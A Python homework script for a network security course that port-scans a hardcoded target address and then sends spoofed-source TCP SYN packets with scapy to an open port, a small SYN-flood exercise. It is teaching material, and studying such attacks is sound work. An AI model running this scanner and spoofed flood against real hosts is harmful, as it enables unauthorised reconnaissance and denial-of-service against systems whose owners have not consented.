#!/usr/bin/env python3.4

# Author: Alex Dunker
# ECN: adunker
# HW: 8
# Filename: Dunker_hw08.py
# Due Date: 03/22/2016

import socket
from scapy.all import *


class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        # File to write to
        f = open('openports.txt', 'wa')
        for testport in range(rangeStart, rangeEnd+1):
            # Set up the socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set the timeout
            sock.settimeout(0.1)
            # Check the port
            result = sock.connect_ex((self.targetIP, testport))
            if result == 0:
                # Write to the file
                f.write(str(testport) + '\n')
            sock.close()

    def attackTarget(self, port):
        # Open file with lists of open ports
        with open("openports.txt", 'r') as f:
            lines = f.readlines()

        # Ports to check
        ports = []
        for line in lines:
            ports.append(int(line))

        # Check if the port was open
        if port in ports:
            for i in range(5):
                # Send the packet
                send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(dport=port, flags="S"))
            return 1
        else:
            return 0



def main():
    # Testing
    attackIP = "128.46.4.86"
    spoofIP = "10.1.10.2"
    testAttack = TcpAttack(spoofIP, attackIP)
    testAttack.scanTarget(1, 65535)
    testAttack.attackTarget(22)

if __name__ == "__main__":
    main()
